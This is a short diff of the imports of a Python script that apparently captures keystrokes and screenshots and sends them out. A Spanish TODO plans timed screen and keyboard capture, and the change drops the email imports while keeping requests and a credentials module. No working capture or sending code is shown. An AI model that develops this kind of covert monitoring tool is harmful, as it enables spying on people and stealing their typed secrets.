@@ -4,15 +4,8 @@ from key_listener import KeyListener
 import sys
 from PIL import ImageGrab
 import re
-import smtplib
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.image import MIMEImage
-from PIL import ImageGrab
 import requests
 import json
-import io
 import credentials
 
 # TODO threading para soportar capturas de pantalla cada x tiempo y captura de teclado cada y
